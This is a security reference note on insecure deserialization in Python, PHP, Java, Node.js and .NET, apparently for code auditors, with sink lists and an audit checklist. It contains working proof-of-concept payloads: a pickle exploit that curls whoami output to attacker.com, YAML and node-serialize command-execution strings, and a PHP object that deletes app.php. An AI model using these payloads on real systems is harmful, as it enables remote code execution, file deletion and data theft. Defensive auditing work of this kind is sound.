# Insecure Deserialization — Deep Protocol by Language

> **Context:** Deserializing untrusted data is one of the few object-class vulnerabilities that guarantees RCE by design. The attack surface is the deserialization machinery itself, not the application logic.

**Tags:** #critical #rce #deserialization #python #nodejs #php #java #dotnet
**OWASP:** A08:2021 Software and Data Integrity Failures
**CVSS Base:** 9.8 (Critical — unauthenticated RCE)

---

## `grep_search` Rapid-Strike Targets

| Language | Sinks |
|---|---|
| Python | `pickle.loads(`, `pickle.load(`, `yaml.load(`, `marshal.loads(`, `shelve.open(`, `joblib.load(` |
| Node.js | `unserialize(`, `_.merge(req.body`, `JSON.parse` + `eval(`, `serialize-javascript` |
| PHP | `unserialize(`, `phar://` in any file path function |
| Java | `readObject(`, `ObjectInputStream(`, `XMLDecoder(`, `XStream`, `kryo.readObject` |
| .NET | `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`, `JavaScriptSerializer` |
| Ruby | `Marshal.load(`, `YAML.load(` (unsafe Psych) |

---

## Language Tactical Playbooks

### 1. Python — `pickle.loads()` RCE

The `__reduce__` dunder method defines what is executed upon deserialization. The attacker has full control.

**Proof-of-Concept payload:**
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        cmd = "curl https://attacker.com/$(whoami)"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)  # Send this as a cookie or POST param
```

**Detection:** `grep_search` for `pickle.loads(base64.b64decode(`, `pickle.loads(request.`, `shelve.open(`. Also scan for `joblib.load(` — identical attack surface with a scientific/ML framing.

**`yaml.load()` variant — Critical mass:** If `Loader` is not specified or uses `yaml.UnsafeLoader`, this is exploitable:
```python
# VULNERABLE
yaml.load(user_input)
yaml.load(user_input, Loader=yaml.Loader)

# SAFE
yaml.safe_load(user_input)
yaml.load(user_input, Loader=yaml.SafeLoader)
```
**Payload:** `!!python/object/apply:os.system ["id"]`

---

### 2. PHP — `unserialize()` Magic Method Exploitation

PHP's magic methods become the exploit gadget chain entrypoints.

- `__wakeup()` — triggered immediately on deserialization.
- `__destruct()` — triggered when the object is garbage collected.
- `__toString()` — triggered when the object is coerced to a string.

**Real-world gadget pattern (simplified):**
```php
// If this class exists in the codebase...
class Cleanup {
    public $filename;
    public function __destruct() {
        unlink($this->filename); // Deletes arbitrary file
    }
}

// Attacker crafts:
$payload = 'O:7:"Cleanup":1:{s:8:"filename";s:20:"/var/www/html/app.php";}';
unserialize(base64_decode($_COOKIE['data']));
```

**`phar://` stream wrapper bypass (critical vector):**
- PHP deserializes the metadata of `.phar` files automatically on any filesystem function that accepts a path.
- If an attacker can upload an arbitrary file and control a path parameter, trigger with: `phar:///var/www/uploads/evil.gif/`.
- **`grep_search`:** `file_exists(`, `fopen(`, `include(` where the path comes from user input (even after extension checks).

---

### 3. Java — Gadget Chains via `ObjectInputStream`

The goal is to find a "gadget chain" — a sequence of method calls across trusted libraries already in the classpath that, when chained, leads to code execution.

**Key library gadget chains (detected via `ysoserial`):**
- `CommonsCollections3.1`: Most common; exploits `InvokerTransformer`.
- `Spring`: `DefaultListableBeanFactory`.
- `JBoss`: Various chains in RichFaces/Seam.

**Static detection priority:**
```java
// High-priority sinks
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.readObject(); // CRITICAL
```

**`grep_search`:** `ObjectInputStream(`, `readObject(`, `readUnshared(`, `XMLDecoder(` (Java beans DSL = full arbitrary object creation).

---

### 4. Node.js — `node-serialize` IIFE Injection

The `_$$ND_FUNC$$_` prefix causes the library to `eval` a function string upon deserialization.

**Payload:**
```json
{
  "rce": "_$$ND_FUNC$$_function(){require('child_process').execSync('id').toString()}()"
}
```

**`grep_search`:** `unserialize(` from `node-serialize` package, `serialize-javascript`.

---

### 5. .NET — `BinaryFormatter` / `TypeConfuseDelegate`

Microsoft officially deprecated `BinaryFormatter` due to being **inherently insecure by design**. Any application still using it is vulnerable.

**`TypeConfuseDelegate` chain:** Exploits `Delegate.DynamicInvoke` with a crafted `MulticastDelegate` to achieve RCE.

**`grep_search`:** `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`, `LosFormatter`.

---

## Chained Exploitation Paths

```
Python Pickle (via ML model file upload) → RCE → Env dump → Cloud credentials
PHP unserialize (via base64 cookie) → Magic method gadget → File write → Webshell
Java readObject (via message queue consumer) → Gadget chain → OS command execution
PHP phar:// (via file upload + path parameter) → Deserialization → Admin takeover
.NET BinaryFormatter (via ViewState) → TypeConfuseDelegate → SYSTEM privilege
```

---

## Strategic Checklist for Auditor
1. [ ] Identify all deserialization calls and trace the data origin.
2. [ ] Check if the serialized payload is signed (HMAC) to prevent tampering.
3. [ ] For PHP: audit every filesystem function (`file_exists`, `fopen`, `include`) for user-controlled path parameters (phar bypass).
4. [ ] For Java: identify all libraries in the classpath against known gadget chains.
5. [ ] For Python: check if ML model loading uses `pickle` or `joblib` with untrusted files.

---

*Tags: #critical #rce #deserialization #python #nodejs #php #java #dotnet #shiva-vault*
